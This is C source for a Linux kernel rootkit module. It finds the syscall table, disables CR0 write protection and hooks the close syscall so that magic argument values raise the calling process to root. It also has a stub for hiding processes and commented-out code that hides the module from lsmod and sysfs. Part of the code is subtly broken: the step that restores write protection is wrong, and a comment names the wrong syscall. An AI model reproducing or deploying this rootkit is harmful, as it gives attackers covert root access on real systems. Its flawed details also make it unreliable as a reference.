#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <asm/unistd.h>

#if defined(__386__)
#define SYSCALL_TABLE_START 0xc0000000
#define SYSCALL_TABLE_STOP 0xd0000000
typedef unsigned int pointer_size_t;
#else
#define SYSCALL_TABLE_START (unsigned long) 0xffffffff81000000l
#define SYSCALL_TABLE_STOP (unsigned long) 0xffffffffa2000000l
typedef unsigned long pointer_size_t;
#endif

/***************************************************************************/
/* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
#define ELEVATE_UID -23121990
#define HIDE_PROCESS -19091992


/***************************************************************************/


unsigned long **syscall_table;

asmlinkage int (*original_close)(int fd);


int elevate_current_privileges(void)
{
    int err = -1;

    struct cred *elevated_cred = prepare_creds();
    kuid_t elevated_uid;
    kgid_t elevated_gid;
    elevated_uid.val = 0;
    elevated_gid.val = 0;

    if (elevated_cred != NULL) {
        elevated_cred->uid = elevated_cred->euid = elevated_cred->suid
             = elevated_cred->fsuid = elevated_uid;
        elevated_cred->gid = elevated_cred->egid = elevated_cred->sgid
             = elevated_cred->fsgid = elevated_gid;

        commit_creds(elevated_cred);
        err = 0;
    }

    return err;
}

int hide_current_process(void)
{
    return 0;
}

asmlinkage int my_close(int fd)
{
    int err = 0;

    if (fd == ELEVATE_UID)
        elevate_current_privileges();    
    else if (fd == HIDE_PROCESS)
        hide_current_process();
    else
        err = original_close(fd);

    return err;
}

pointer_size_t **find_syscall_table(void)
{
    pointer_size_t i;
    pointer_size_t **table;
    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
        table = (pointer_size_t **) i;
        if ( table[__NR_close] == (pointer_size_t *) sys_close)
            return &table[0];
    }
    return NULL;
}




int rootkit_init(void)
{
    printk("Rootkit loaded\n");
    
    /* Uncomment the following lines after completion of module 
     * Can't rmmod it if we have it uncommented during dev
     * That's just cumbersome during dev
     */
    
    /*
    // stop from showing on lsmod
    list_del_init(&__this_module.list);

    // stop showing in /proc/kallsyms
    kobject_del(&THIS_MODULE->mkobj.kobj);
    */
    
    syscall_table = find_syscall_table();
    if (!syscall_table) {
        goto out;    
    }

    printk("Syscall table at %p\n", syscall_table);
    
    // make writable by disabling write protect
    write_cr0(read_cr0() & (~0x10000));

    // hijack chdir system call
    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
    syscall_table[__NR_close] = (void *) my_close;

    // enable write protected
    write_cr0(read_cr0() & 0x10000);


    out:
    return 0;
}

void rootkit_exit(void)
{
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_close] = (void *) original_close;
    write_cr0(read_cr0() & 0x10000);
    printk("Rootkit unloaded\n");
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
